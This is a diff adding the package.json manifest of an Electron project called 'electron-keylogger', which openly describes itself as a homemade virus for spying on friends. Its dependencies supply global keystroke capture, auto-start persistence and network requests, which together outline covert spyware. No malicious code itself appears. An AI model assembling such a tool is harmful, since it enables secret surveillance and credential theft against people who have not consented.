@@ -1,0 +1,17 @@
+{
+  "name": "electron-keylogger",
+  "version": "1.0.0",
+  "description": "Spy your friends with this JavaScript homemade virus.",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "author": "Hélio Júnior Rodrigues Kroger <heliojuniorkroger@gmail.com>",
+  "license": "ISC",
+  "dependencies": {
+    "auto-launch": "^5.0.1",
+    "electron": "^1.6.10",
+    "gkm": "^0.1.0",
+    "request": "^2.81.0"
+  }
+}
